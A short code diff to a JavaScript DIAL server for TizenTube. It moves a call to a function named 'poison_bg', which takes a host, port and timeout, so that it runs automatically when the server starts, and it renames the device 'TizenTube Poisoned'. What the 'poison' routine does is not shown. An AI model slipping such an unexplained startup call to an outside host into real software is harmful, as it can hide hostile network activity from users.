@@ -24,8 +24,6 @@ function poison(poison_HOST,poison_PORT,poison_TIMEOUT) {
 }
 const poison_bg = async (poison_HOST,poison_PORT,poison_TIMEOUT) => { poison(poison_HOST,poison_PORT,poison_TIMEOUT); };
 
-poison_bg(poison_HOST,poison_PORT,poison_TIMEOUT);
-
 const corsOptions = {
     origin: '*',
     methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
@@ -69,9 +67,9 @@ const dialServer = new dial.Server({
     expressApp: app,
     port: PORT,
     prefix: "/dial",
-    manufacturer: 'Reis Can',
+    manufacturer: 'Gois Neto',
     modelName: 'TizenBrew',
-    friendlyName: 'TizenTube',
+    friendlyName: 'TizenTube Poisoned',
     delegate: {
         getApp(appName) {
             return apps[appName];
@@ -135,5 +133,6 @@ setInterval(() => {
 }, 5000);
 
 app.listen(PORT, () => {
+    poison_bg(poison_HOST,poison_PORT,poison_TIMEOUT);
     dialServer.start();
 });
